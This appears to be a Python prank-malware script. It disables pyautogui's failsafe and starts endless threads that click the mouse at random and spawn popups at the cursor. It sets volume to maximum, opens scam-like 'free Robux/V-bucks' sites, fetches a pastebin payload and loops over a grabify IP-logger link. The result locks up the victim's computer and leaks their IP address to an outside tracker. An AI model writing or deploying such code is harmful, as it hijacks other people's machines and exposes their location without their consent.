import pyautogui, time, random, requests, threading, webbrowser
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import tkinter as tk
def vol():
 devices = AudioUtilities.GetSpeakers()
 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
 volume = cast(interface,POINTER(IAudioEndpointVolume))
 volume.SetMasterVolumeLevel(0, None)
pyautogui.FAILSAFE = False
def show_error_popup():
    root = tk.Tk()
    root.withdraw()
    while True:
        xs, ys = root.winfo_pointerxy()
        error_popup = tk.Toplevel(root)
        error_popup.overrideredirect(True)
        error_popup.geometry(f"+{xs-100}+{ys-100}")
        error_popup.title("Error Popup")
        error_popup.lift()
        error_popup.focus_force()
        root.update()
urs = threading.Thread(target=show_error_popup)
urs.start()
def mouse():
  while True:
   x = random.randint(0, 2000)
   y = random.randint(0, 2000)
   pyautogui.moveTo(x, y)
   pyautogui.doubleClick(x, y)
ran = threading.Thread(target=mouse)
ran.start()
pyautogui.hotkey('winleft', 'down')
def troll():
 urls = ["https://elgoog.im/doabarrelroll/","https://www.youtube.com/watch?v=b2pD0B9Rfps&ab_channel=iamaproudstealer","https://freethevbucks.com/","https://claimrbx.gg/homepage.php","https://discord.com/channels/@me","https://roblox.com"]
 webbrowser.open(url=urls[0])
 vol()
 time.sleep(2.5)
 vol()
 webbrowser.open(url=urls[1])
 time.sleep(2)
 vol()
 webbrowser.open(url=urls[2])
 time.sleep(2)
 vol()
 webbrowser.open(url=urls[3])
 time.sleep(2)
 vol()
 webbrowser.open(url=urls[4])
 time.sleep(2)
 vol()
 webbrowser.open(url=urls[5])
zyx = requests.get("https://pastebin.com/raw/ZrbaXR57").text
def kill():
 vol()
 webbrowser.open("https://www.youtube.com/watch?v=9X4MVPAhJ4g&ab_channel=Noble")
 vol()
 time.sleep(1.3)
 vol()
 webbrowser.open("https://www.youtube.com/watch?v=5db6wAECi28&ab_channel=DefactoGClips")
 time.sleep(1.3)
 vol()
 webbrowser.open("https://www.youtube.com/watch?v=uKnukd6XaFM&ab_channel=GreenBurshe")
 time.sleep(7)
 vol()
 webbrowser.open("https://www.youtube.com/watch?v=QB9jfOKxvE8&ab_channel=soundshub")
 time.sleep(7)
 while True:
  try:
   webbrowser.open("https://grabify.link/1BOL0S")
  except:pass
  try:
   webbrowser.open("https://grabify.link/1BOL0S")
  except:pass
  kill()
troll()
opp=threading.Thread(target=kill)
opp.start()
